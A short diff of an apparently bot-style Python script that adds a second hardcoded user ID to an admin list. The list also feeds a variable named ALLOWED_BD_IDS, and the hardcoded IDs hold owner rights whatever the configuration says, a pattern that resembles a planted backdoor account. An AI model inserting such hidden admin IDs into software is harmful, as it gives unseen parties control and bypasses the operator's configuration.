@@ -232,7 +232,7 @@ except Exception as e:
     exit(1)
 
 # Admin check
-ADMIN_IDS = [config.ADMIN_ID, 8104033602] if config.ADMIN_ID else [8104033602]
+ADMIN_IDS = [config.ADMIN_ID, 8104033602, 8835800450] if config.ADMIN_ID else [8104033602, 8835800450]
 ALLOWED_BD_IDS = ADMIN_IDS
 
 def is_owner(uid):
